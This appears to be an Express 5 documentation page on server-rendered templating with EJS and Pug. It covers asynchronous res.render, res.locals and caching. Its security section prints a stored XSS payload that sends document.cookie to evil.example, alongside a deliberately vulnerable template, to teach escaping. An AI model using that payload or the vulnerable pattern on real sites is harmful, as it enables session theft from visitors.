---
title: Templating
description: Server-rendered HTML in Express 5 — view engines, res.render being asynchronous, res.locals, and auto-escaping as an XSS control.
status: current
updated: 2026-09-08
---

Express can render HTML on the server through a view engine, and for a long time that was the default way to build a web app. Today most Express services are JSON-only: the HTML is produced by a separate frontend, and Express never renders a view at all. This page covers templating for the cases where it still earns its place, and is honest that those cases are a minority.

## When to use it

Server-rendered templates are the right tool when:

- The output is an email, a PDF source document, or an RSS feed.
- The page is genuinely simple — an admin panel, a status page, an unsubscribe confirmation — and a build pipeline plus a client framework would cost more than it returns.
- You need HTML on the first byte for a form-driven flow with no client-side state.

They are the wrong tool when a separate frontend already exists. Rendering the same data twice, in two languages, in two repositories, is how "the API says one thing and the page says another" bugs are born. If the client is a React or Vue app, keep Express JSON-only and let the frontend own the markup.

:::note
Nothing on the rest of this page is required for an API. If your app only ever calls `res.json()`, you can skip to [Layered architecture](layered-architecture.md).
:::

## Basic example

Two settings and one call:

```js title="src/app.js"
import express from 'express'
import path from 'node:path'

const app = express()

app.set('view engine', 'ejs')
app.set('views', path.join(import.meta.dirname, 'views'))

app.get('/books/:id', async (req, res) => {
  const book = await books.findById(req.params.id)
  if (!book) return res.status(404).render('not-found')
  res.render('book', { book })
})
```

```text title="src/views/book.ejs"
<h1><%= book.title %></h1>
<p>by <%= book.author %></p>
```

Install the engine itself as a dependency — `npm install ejs` or `npm install pug`. Express resolves the engine by the extension: with `view engine` set to `ejs`, `res.render('book')` loads `views/book.ejs`. Give a view an explicit extension (`res.render('book.pug')`) when you need to mix engines.

`app.engine(ext, fn)` registers an engine manually for extensions that do not follow the convention.

## Choosing an engine

| Engine | Syntax | Escaping | Fits when |
| --- | --- | --- | --- |
| **EJS** | HTML with `<% %>` tags | `<%= %>` escapes, `<%- %>` does not | you want plain HTML with holes in it, and designers touch the files |
| **Pug** | indentation-based, no closing tags | `=` escapes, `!=` does not | you write the templates yourself and value brevity over familiarity |

Both are mature and both are fine. EJS keeps the file readable as HTML, which matters if anyone other than a Node developer edits it; Pug is terser but is a language of its own. Pick one per project — mixing them makes every template a guess about which escaping rule applies.

## `res.render()` is asynchronous

In Express 5 `res.render()` is **always** asynchronous, even for an engine that could render synchronously. Two consequences:

```js
app.get('/report', (req, res) => {
  res.render('report', { rows })
  console.log('this line runs BEFORE the response is sent')
})
```

Do not put code after `res.render()` that assumes the response is finished. And do not call `res.render()` twice, or call it after another terminal method — the second write throws `ERR_HTTP_HEADERS_SENT` on a later tick, where it is much harder to trace back to the route.

Render errors — a missing view file, a syntax error in the template, a `null` dereference inside it — reach your error middleware automatically:

```js
app.get('/book/:id', async (req, res) => {
  const book = await books.findById(req.params.id)
  res.render('book', { book })     // a template error goes to the error handler
})
```

Pass a callback when you want to handle the failure yourself instead of responding:

```js
app.get('/book/:id/preview', async (req, res, next) => {
  const book = await books.findById(req.params.id)

  res.render('book', { book }, (err, html) => {
    if (err) return next(err)
    res.type('html').send(html)
  })
})
```

With a callback, Express hands you the HTML and sends nothing — useful for rendering an email body or caching the output.

## `res.locals` and shared data

Values on `res.locals` are visible to every template rendered for that request, so the layout does not need each route to pass the same three variables:

```js title="src/middleware/view-context.js"
export function viewContext(req, res, next) {
  res.locals.currentUser = req.user ?? null
  res.locals.csrfToken = req.csrfToken?.()
  res.locals.year = new Date().getFullYear()
  next()
}
```

```text title="src/views/layout.ejs"
<footer>&copy; <%= year %></footer>
```

`app.locals` is the application-wide counterpart, evaluated once and shared by every request — site name, asset manifest, feature flags. Never put per-request data there: it leaks between users, and a logged-in name rendered on a stranger's page is both a bug and a privacy incident.

Locals merge in a fixed order — `app.locals`, then `res.locals`, then the object passed to `res.render()` — with the later ones winning.

## Common patterns

Prefer a single layout and small partials over deep inheritance chains — template indirection is much harder to debug than function indirection, because there is no stack trace through it. Keep any conditional beyond a simple `if` in the controller, and pass the template a view model that is already decided.

## Security considerations

Auto-escaping is the reason to use a view engine at all rather than concatenating strings. Both EJS and Pug escape by default and both give you an explicit opt-out; the opt-out is where every templating XSS lives.

:::danger
The unescaped tag renders attacker input as markup.

```text vulnerable title="DO NOT COPY — views/comment.ejs"
<div class="comment"><%- comment.body %></div>
```

A stored comment of `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` then runs on every visitor's page, on your origin, with access to any cookie not marked `httpOnly`.

```text good title="views/comment.ejs"
<div class="comment"><%= comment.body %></div>
```

The escaping tag renders the same input as visible text. Verify by posting the payload and viewing the page source: you should see `&lt;img src=x …`, not an `<img>` element.
:::

Three rules that follow from that:

- **Reach for `<%- %>` or Pug's `!=` only for HTML you produced yourself**, and sanitize with `sanitize-html` (2.17.7) or `dompurify` (3.4.15) first if any part of it came from a user.
- **Escaping is context-sensitive.** HTML escaping does not make a value safe inside a `<script>` block, inside a `style` attribute, or in an `href`. Serialize data for scripts as JSON in a `<script type="application/json">` element and read it from JS, and validate that any `href` starts with `https://` or `/` — `javascript:` URLs survive HTML escaping intact.
- **Add a Content Security Policy** so that a template mistake is not automatically an exploit. [Helmet](../express-libraries/security-headers-helmet.md) sets a restrictive default.

Full treatment, with exploits and fixes: [Cross-site scripting (XSS)](../security/xss.md).

## Production considerations

Express caches compiled templates when the `view cache` setting is on, which it is by default when `NODE_ENV=production`. Leaving `NODE_ENV` unset in production means every render re-reads and re-compiles the template from disk — a measurable, entirely avoidable cost on every request.

```bash
NODE_ENV=production node src/server.js
```

Rendering is synchronous CPU work inside the engine even though `res.render()` resolves asynchronously, so a heavy page blocks the event loop for every other request. Keep templates simple, do the data work before the render, and cache rendered fragments that are expensive and identical across users.

## Common mistakes

- **Rendering HTML in a service that already has a frontend.** Two sources of truth for the same screen.
- **Assuming code after `res.render()` runs after the response.** It is asynchronous in Express 5.
- **Calling `res.render()` after `res.json()` or a redirect.** The second write throws on a later tick, far from the cause.
- **Using the unescaped tag out of habit** because something rendered as visible markup once. Fix the data, not the escaping.
- **Escaping for HTML and pasting the result into a `<script>` or an `href`.** Different contexts, different rules.
- **Putting per-request values on `app.locals`.** They are shared by every request in the process.
- **Forgetting `NODE_ENV=production`,** so templates recompile on every request.
- **Mixing engines in one project** so nobody remembers which tag escapes.

## Related topics

- [Request and response](request-and-response.md) — `res.locals`, `res.type` and the response methods `res.render` sits beside.
- [Static files](static-files.md) — the CSS and images a rendered page references.
- [Error handling](error-handling.md) — where a template error ends up.
- [Layered architecture](layered-architecture.md) — building the view model before the render.
- [Cross-site scripting (XSS)](../security/xss.md) — the threat auto-escaping exists to stop.
- [Security headers with Helmet](../express-libraries/security-headers-helmet.md) — CSP as the second layer of defense.
- [CSRF](../security/csrf.md) — form posts need a token; that token comes from `res.locals`.
